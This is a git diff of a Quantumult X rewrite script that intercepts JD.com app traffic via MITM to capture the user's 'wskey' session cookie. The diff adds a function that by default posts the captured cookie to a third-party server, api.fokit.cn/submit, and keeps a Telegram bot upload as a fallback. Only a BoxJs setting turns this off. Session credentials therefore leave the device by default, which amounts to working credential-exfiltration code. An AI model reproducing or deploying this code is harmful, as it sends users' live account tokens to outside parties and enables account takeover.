@@ -1,26 +1,28 @@
 /*
 脚本名称：京东 WSKEY
-更新时间：2023-02-03
-使用方法：打开 京东App --> 消息中心（右上角）获取京东 WSKEY。
+更新时间：2023-03-21
+使用方法：划掉后台重新打开 京东APP 即可自动抓取WSKEY。
+注意事项：脚本抓取的WSKEY默认自动提交到服务器（自动上车），可通过BoxJs设置关闭自动提交功能。
 重写订阅：https://raw.githubusercontent.com/lixinzai/rules/main/get_jd_wskey.conf
-BoxJs 订阅：https://raw.githubusercontent.com/lixinzai/rules/main/boxjs/lixinzai.boxjs.json
+BoxJs订阅：https://raw.githubusercontent.com/lixinzai/rules/main/boxjs/lixinzai.boxjs.json
 
 ================Quantumult X配置=================
 [rewrite_local]
-^https:\/\/api\-dd\.jd\.com\/client\.action\?functionId=getSessionLog url script-echo-response https://raw.githubusercontent.com/lixinzai/rules/main/get_jd_wskey.js
+^https:\/\/api\.m\.jd\.com\/client\.action\?functionId=newUserInfo url script-response-body https://raw.githubusercontent.com/lixinzai/rules/main/get_jd_wskey.js
 
 [MITM]
-hostname = api-dd.jd.com
+hostname = api.m.jd.com
 
 */
 
 const $ = new Env('京东 WSKEY');
 const WSKEY = $request.headers['Cookie'] || $request.headers['cookie'];
-const pin = encodeURIComponent(WSKEY.match(/pin=([^=;]+?);/)[1]);
+const respBody = $.toObj($response.body);
+const pin = respBody.userInfoSns.unickName;
 const key = WSKEY.match(/wskey=([^=;]+?);/)[1];
-$.bot_token = $.getdata('WSKEY-TG-BOTTOKEN') || '';
-$.chat_ids = $.getdata('WSKEY-TG-CHATID') || [];
-$.autoUpload = $.getdata('WSKEY-AUTOUPLOAD') || '';
+$.bot_token = $.getdata('WSKEY_TG_BOT_TOKEN') || '';
+$.chat_ids = $.getdata('WSKEY_TG_USER_ID') || [];
+$.autoUpload = $.getdata('WSKEY_AUTO_UPLOAD') || '';
 
 !(async () => {
   if (!pin || !key) {
@@ -30,7 +32,7 @@ $.autoUpload = $.getdata('WSKEY-AUTOUPLOAD') || '';
   const cookie = `wskey=${key};pt_pin=${pin};`;
   const userName = pin;
   const decodeName = decodeURIComponent(userName);
-  let cookiesData = JSON.parse($.getdata('WSKEYList') || '[]');
+  let cookiesData = JSON.parse($.getdata('wskeyList') || '[]');
   let updateIndex;
   const existCookie = cookiesData.find((item, index) => {
     const ck = item.cookie;
@@ -50,6 +52,7 @@ $.autoUpload = $.getdata('WSKEY-AUTOUPLOAD') || '';
     cookiesData.push({ userName: decodeName, cookie: cookie, });
     $.needUpload = true;
   }
+
   if ($.autoUpload !== "false") {  // 自动上传
     if ($.needUpload) {
       if (typeof $.chat_ids != 'object') {
@@ -64,18 +67,19 @@ $.autoUpload = $.getdata('WSKEY-AUTOUPLOAD') || '';
           let update = await updateCookie_1(cookie, chat_id);
           if ($.bot_token && !update) {
             $.log('Use Telegram API...\n')
-            await updateCookie_1(cookie, chat_id);
+            await updateCookie_2(cookie, chat_id);
           }
         }
       }
       if ($.success) {
-        $.setdata(JSON.stringify(cookiesData, null, 2), 'WSKEYList');
+        $.setdata(JSON.stringify(cookiesData, null, 2), 'wskeyList');
       } else {
         $.subt = '⚠️ WSKEY 提交失败。';
         $.msg($.subt, cookie);
       }
     } else {
       $.msg('⚠️ 无需更新 WSKEY。', cookie);
+      $.subt = `⚠️ 【${respBody?.userInfoSns?.petName || '提示'}】无需更新 WSKEY。`;
     }
   } else {  // 本地使用
     $.subt = '🎉 WSKEY 获取成功。';
@@ -85,13 +89,63 @@ $.autoUpload = $.getdata('WSKEY-AUTOUPLOAD') || '';
 })().catch((e) => $.logErr(e)).finally(() => $.done());
 
 function updateCookie_1(wskey, chat_id) {
+  url = "https://api.fokit.cn/submit";
+  if ($.bot_token) {
+    url += `?bot_token=${$.bot_token}`;
+  };
+  if (chat_id != []) {
+    url += `&chat_id=${chat_id}`;
+  };
+  let opt = {
+    url,
+    body: `text=${wskey}`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    timeout: 10000,
+  };
+  return new Promise(resolve => {
+    $.post(opt, async (err, resp, data) => {
+      try {
+        if (err) {
+          $.log(`${JSON.stringify(err)}\n`);
+          $.success = false;
+        } else {
+          data = JSON.parse(data);
+          if (data.ok) {
+            $.subt = `🎉 【${respBody?.userInfoSns?.petName || '京东'}】WSKEY 提交成功。`;
+            $.msg($.subt, wskey);
+            $.success = true;
+          } else if (data.error_code === 400) {
+            $.subt = '⚠️ Telegram bot 无发送消息权限。';
+            $.msg($.subt, wskey);
+            $.success = false;
+          } else if (data.error_code === 401) {
+            $.subt = '⚠️ Telegram bot token 填写错误。';
+            $.msg($.subt, wskey);
+            $.success = false;
+          } else {
+            $.log("请求失败：", typeof data, $.toStr(data));
+            $.success = false;
+          }
+        }
+      } catch (error) {
+        $.logErr(error);
+      } finally {
+        resolve($.success);
+      }
+    })
+  })
+}
+
+function updateCookie_2(wskey, chat_id) {
   return new Promise((resolve) => {
     const opts = {
-      url: `https://api.telegram.org/bot${$.bot_token}/sendMessage?chat_id=${chat_id}`,
+      url: `https://api.telegram.org/bot${$.bot_token}/sendMessage`,
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
       },
-      body: `&text=${wskey}&disable_web_page_preview=true`,
+      body: `chat_id=${chat_id}&text=${wskey}&disable_web_page_preview=true`,
     };
     $.post(opts, (err, resp, data) => {
       try {
@@ -101,7 +155,7 @@ function updateCookie_1(wskey, chat_id) {
         } else {
           data = JSON.parse(data);
           if (data.ok) {
-            $.subt = '🎉 WSKEY 提交成功。';
+            $.subt = `🎉 【${respBody?.userInfoSns?.petName || '京东'}】WSKEY 提交成功。`;
             $.msg($.subt, wskey);
             $.success = true;
           } else if (data.error_code === 400) {
